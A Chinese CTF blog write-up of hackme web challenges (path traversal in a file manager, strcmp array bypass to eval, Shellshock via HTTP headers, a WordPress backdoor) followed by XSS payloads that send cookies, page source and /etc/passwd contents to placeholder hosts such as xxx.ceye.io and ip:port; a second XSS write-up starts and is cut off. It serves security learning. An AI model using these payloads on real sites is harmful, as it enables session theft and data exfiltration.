<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_in_web</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $file = realpath($file);</span><br><span class="line">    <span class="keyword">if</span>(strpos($file, ROOT) !== <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要读的路径字符串里面是有ROOT的，所以返回true符合条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">    $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">    $fname2 = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">    savefile($dir, $fname2);</span><br><span class="line">    $fname = $fname2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个不post直接就向下执行了</p>
<p>通过如下代码输出文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">$buffer = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">    $buffer.= fgets($fp, <span class="number">4096</span>);</span><br><span class="line">&#125;</span><br><span class="line">@fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($buffer);</span><br></pre></td></tr></table></figure>

<p>以后我全局搜索再加个buffer.233</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=../../../../../var/www/webhdisk/.config/.htusers.php</span></span><br></pre></td></tr></table></figure>

<p>/var/www/webhdisk/data/guest一共有五层，所以需要向上跳五层，最终拿到文件内容</p>
<p><img src="https://s2.ax1x.com/2019/10/22/KGedv4.png" alt="KGedv4.png"></p>
<h3 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h3><p>拿shell命令执行，全局搜索eval,assert之类的，发现在debug的地方存在问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码就比较简单了，secret我们知道，主要bypass的代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">    show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个必须三个都返回0才能避免show_error，但是一个字符串不可能同时是这三个字符串，不过strcmp有经典的数组绕过，直接就可以bypass了，传给dir[]=1,其他的照常，就可以成功命令执行了。</p>
<h3 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a>command-executor</h3><p>这题提供了几个功能</p>
<ul>
<li>Tar File</li>
<li>Cmd exec(只能执行ls和env)</li>
<li>ls（查看各个目录的内容)</li>
</ul>
<p>首先通过ls功能发现根目录有flag和flag-reader，而且可以通过php伪协议读源码</p>
<p>主要代码还是index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_default</span><span class="params">()</span> </span>&#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;Welcome to <span class="keyword">use</span> <span class="title">our</span> <span class="title">developer</span> <span class="title">assistant</span> <span class="title">service</span>. <span class="title">We</span> <span class="title">provide</span> <span class="title">servial</span> <span class="title">useless</span> <span class="title">features</span> <span class="title">to</span> <span class="title">make</span> <span class="title">your</span> <span class="title">developing</span> <span class="title">life</span> <span class="title">harder</span>.&lt;/<span class="title">p</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="title">img</span> <span class="title">src</span>="<span class="title">windows</span>-<span class="title">run</span>.<span class="title">jpg</span>" <span class="title">alt</span>="<span class="title">command</span> <span class="title">executor</span>"&gt;</span><br><span class="line">&lt;?<span class="title">php</span> &#125;</span><br><span class="line">?&gt;&lt;!<span class="title">DOCTYPE</span> <span class="title">html</span>&gt;</span><br><span class="line">&lt;<span class="title">html</span> <span class="title">lang</span>="<span class="title">en</span>"&gt;</span><br><span class="line">  &lt;<span class="title">head</span>&gt;</span><br><span class="line">    &lt;<span class="title">meta</span> <span class="title">charset</span>="<span class="title">UTF</span>-8"&gt;</span><br><span class="line">    &lt;<span class="title">title</span>&gt;<span class="title">Command</span> <span class="title">Executor</span>&lt;/<span class="title">title</span>&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>="<span class="title">stylesheet</span>" <span class="title">href</span>="<span class="title">bootstrap</span>/<span class="title">css</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">css</span>" <span class="title">media</span>="<span class="title">all</span>"&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>="<span class="title">stylesheet</span>" <span class="title">href</span>="<span class="title">comic</span>-<span class="title">neue</span>/<span class="title">font</span>.<span class="title">css</span>" <span class="title">media</span>="<span class="title">all</span>"&gt;</span><br><span class="line">    &lt;<span class="title">style</span>&gt;</span><br><span class="line">      <span class="title">nav</span> &#123; <span class="title">margin</span>-<span class="title">bottom</span>: 1<span class="title">rem</span>; &#125;</span><br><span class="line">      img &#123; max-width: <span class="number">100</span>%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="index.php"&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class="navbar-nav"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($pages <span class="keyword">as</span> <span class="keyword">list</span>($file, $title)): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;li class="nav-item"&gt;</span><br><span class="line">          &lt;a class="nav-link" href="index.php?func=&lt;?=$file?&gt;"&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;&lt;?php if(is_callable('render')) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>首先大概看一下index.php的逻辑</p>
<p>这个black_list其实已经很明显的在提示这是一个bash破壳漏洞了…</p>
<p>上Freebuf学一波，讲的很清楚</p>
<p><a href="https://www.freebuf.com/articles/system/50065.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/50065.html</a></p>
<p>如果在全局变量中发现/flag关键字，或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\(\)\s*\&#123;\s*:;\s*\&#125;;</span><br></pre></td></tr></table></figure>

<p>满足这个形式的正则，就被detected</p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bash破壳漏洞利用</p>
<p><img src="https://s2.ax1x.com/2019/10/24/KUtDSO.png" alt="KUtDSO.png"></p>
<p>题目中的putenv就充当了这里export的作用，我们可以把user-agent会换成我们的payload</p>
<p>同时bash -c env，最终反弹shell(还有中间加个空格就可以bypass正则了)</p>
<p><img src="https://s2.ax1x.com/2019/10/24/KUtjhV.png" alt="KUtjhV.png"></p>
<p>最终拿flag的payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; &#x2F;var&#x2F;tmp&#x2F;test &lt; &#x2F;var&#x2F;tmp&#x2F;test</span><br></pre></td></tr></table></figure>

<h3 id="Wordpress1"><a href="#Wordpress1" class="headerlink" title="Wordpress1"></a>Wordpress1</h3><p><strong>plugins/core.php中发现问题代码，是个打印flag的函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line">	<span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">			<span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先看一下这个$h…硬拼出来的md5可还行，解密一下这个md5发现是cat flag，最后eval解密后md5的值，也就是说传入一个cat flag就可以，再加上伪造一个ip。</p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>这三道连一起真的挺好…但是xssbot挂了吧？….</p>
<p>记录一下有意思的Payload吧</p>
<p>第一关的xss可以通过svg绕过，或者img绕过，当然其他也有很多标签可以绕过</p>
<p><strong>img绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&quot;onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>本来这里是过滤掉了onerror不过可以通过去掉前面的空格bypass，至于括号的过滤，直接html编码就可以了</p>
<p>这里的html编码对应的alert(1)，如果我们想打cookie,可以用如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>或者说</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://ip:port/"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.body.innerHTML);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p><strong>svg绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ip:port&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xss打源码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;xx.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.createElement(&quot;img&quot;);</span><br><span class="line">img.src&#x3D;&quot;http:&#x2F;&#x2F;ip:port&#x2F;&quot;+escape(document.body.innerHTML);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p><strong>通过ajax打出回显内容</strong></p>
<p><strong>GET型</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string">xmlhttp.onreadystatechange=function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">document.location='http://xxx/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">xmlhttp.open("</span>GET<span class="string">","</span>request.php<span class="string">",true);</span></span><br><span class="line"><span class="string">xmlhttp.send();</span></span><br><span class="line"><span class="string">"</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>POST型</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string">xmlhttp.onreadystatechange=function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">document.location='http://xx/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">xmlhttp.open("</span>POST<span class="string">","</span>request.php<span class="string">",true);</span></span><br><span class="line"><span class="string">xmlhttp.setRequestHeader("</span>Content-type<span class="string">","</span>application/x-www-form-urlencoded<span class="string">");</span></span><br><span class="line"><span class="string">xmlhttp.send("</span>url=file:<span class="comment">///etc/passwd");</span></span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/27/Hackme-web/" data-id="ckabsu3870018kkvr0wa0ek8t" class="article-share-link" data-share="baidu" data-title="Hackme-web">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/27/Hackme-web/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-prompt-1-to-win" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/20/prompt-1-to-win/" class="article-date">
  <time datetime="2019-10-20T12:21:59.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/20/prompt-1-to-win/">prompt(1) to win</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KPz0bR.png" alt="KPz0bR.png"></p>
<p>闭合就完事了。&lt;svg/onload=alert(1)&gt;</p>
<p>IE10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onresize&#x3D;prompt(1) &quot;</span><br></pre></td></tr></table></figure>

<p>IE10下，第一次加载页面时，会调用resize函数</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span 